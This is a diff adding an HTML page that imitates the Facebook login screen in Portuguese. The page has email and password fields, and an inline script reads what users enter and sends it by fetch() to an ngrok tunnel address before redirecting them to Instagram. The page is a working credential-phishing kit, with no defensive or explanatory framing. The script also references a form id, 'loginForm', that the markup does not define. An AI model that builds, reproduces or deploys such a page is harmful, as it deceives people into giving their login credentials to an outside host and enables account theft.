@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook — log in or sign up</title>
+    <link rel="stylesheet" href="./assets/css/index.css">
+</head>
+
+<body>
+    <div class="container">
+        <section class="intro-section">
+            <h1>facebook</h1>
+            <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas em sua vida.</p>
+        </section>
+
+        <section class="signin-section">
+            <div>
+                <form action="loginface" method="post">
+                    <div>
+                        <input type="text" id='iemail' name="email" placeholder="Email ou número de telemóvel" aria-label="Email ou número de telemóvel" required>
+                    </div>
+
+                    <div>
+                        <input type="password" id='isenha' name="password" placeholder="Palavra-passe" aria-label="Palavra-passe" required>
+                    </div>
+
+                    <div>
+                        <button type="submit">Iniciar Sessão</button>
+                    </div>
+
+                    <a href="#">Esqueceu sua senha?</a>
+
+                    <hr />
+
+                    <div class="create-btn">
+                        <button type="button">Criar Nova Conta</button>
+                    </div>
+                </form>
+            </div>
+
+            <p>
+                <a href="#"><strong>Crie uma página</strong></a> para uma celebridade, marca ou empresa.
+            </p>
+        </section>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('iemail').value;
+            const senha = document.getElementById('isenha').value;
+
+            const data = {
+                email: email,
+                senha: senha
+            };
+
+            fetch('https://ff08-189-27-178-196.ngrok-free.app/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erro na requisição: ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.success) {
+                    window.location.href = 'https://www.instagram.com/';
+                } else {
+                    alert('Erro no login: ' + data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                alert('Erro: ' + error.message);
+            });
+        });
+    </script>
+</body>
+
+</html>
